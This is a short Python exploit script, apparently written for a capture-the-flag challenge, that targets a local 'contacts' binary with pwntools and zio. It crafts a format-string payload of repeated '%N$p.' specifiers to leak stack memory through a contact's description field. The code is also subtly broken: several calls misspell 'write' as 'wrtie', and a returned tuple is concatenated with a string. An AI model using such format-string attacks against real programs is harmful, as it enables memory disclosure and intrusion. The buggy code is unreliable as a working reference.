from pwn import *
from zio import *

target = "./contacts"
context(arch = 'i386', os = 'linux')

def get_io(target):
	ELF("./contacts")
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW, 'blue'))
	return io


def create_contact(io, name, number, description):
	io.read_until(">>> ")
	io.write("1\n")
	io.read_until("Name: ")
	io.write(name + "\n")
	io.read_until("No: ")
	io.wrtie(number + "\n")
	io.read_until("description: ")
	io.wrtie(str(len(description)) + "\n");
	io.read_until("description: ")
	io.wrtie(description + "\n");

def display_contact(io):
	io.read_until(">>> ")
	io.wrtie("4\n")
	data = io.read_until("Menu:")
	return data

def gernerate_format_string(index, length):
	data = ""
	while True:
		buff = "%%%d$p."%(index)
		if len(data + buff) > length:
			return data, index
		data += buff
		index += 1

def pwn(io):

	index = 1
	data = gernerate_format_string(index, 500)
	data = 'A'*4 + 'B'*4 + data
	create_contact(io, "pxx", "111", data)
	io.interact()


io = get_io(target)
pwn(io)